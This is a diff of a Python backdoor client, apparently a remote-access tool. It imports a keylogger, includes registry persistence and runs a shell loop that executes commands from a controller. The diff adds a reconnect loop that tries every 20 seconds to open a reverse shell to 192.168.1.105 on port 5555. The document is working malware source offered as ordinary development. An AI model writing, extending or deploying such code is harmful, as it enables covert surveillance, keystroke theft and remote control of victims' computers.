@@ -7,6 +7,7 @@ import threading
 import keylogger
 import shutil
 import sys
+import time
 
 def send_data(data):
 	jsondata = json.dumps(data)
@@ -57,6 +58,17 @@ def persist(reg_name, copy_name):
 	except:
 		send_data("[-] Error creating persistence with the target")
 
+def connection():
+	while True:
+		time.sleep(20)
+		try:
+			s.connect(("192.168.1.105", 5555))
+			shell()
+			s.close()
+			break
+		except:
+			connection()
+
 def shell():
 	while True:
 		command = recv_data()
@@ -103,5 +115,4 @@ def shell():
 
 if __name__ == "__main__":
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("192.168.1.105", 5555))
-	shell()
+	connection()
